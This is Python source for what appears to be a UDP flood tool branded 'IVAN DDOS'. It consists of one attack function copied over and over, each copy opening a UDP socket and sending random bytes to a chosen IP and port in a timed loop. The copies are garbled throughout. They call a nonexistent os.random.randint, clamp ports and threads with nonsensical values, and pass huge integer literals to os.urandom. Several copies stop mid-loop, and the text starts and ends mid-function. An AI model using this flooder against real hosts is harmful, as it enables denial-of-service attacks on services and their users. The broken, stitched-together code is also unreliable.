    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
